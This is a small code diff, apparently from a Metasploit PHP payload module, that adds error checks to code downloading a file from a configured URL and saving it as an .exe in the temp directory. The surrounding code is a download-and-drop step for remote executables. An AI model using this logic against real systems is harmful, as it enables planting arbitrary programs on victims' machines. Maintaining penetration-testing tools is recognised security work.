@@ -56,7 +56,9 @@ module MetasploitModule
     }
     $fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "#{exename}.exe";
     $fd_in = fopen("#{datastore['URL']}", "rb");
+    if ($fd_in === false) { die(); }
     $fd_out = fopen($fname, "wb");
+    if ($fd_out === false) { die(); }
     while (!feof($fd_in)) {
       fwrite($fd_out, fread($fd_in, 8192));
     }
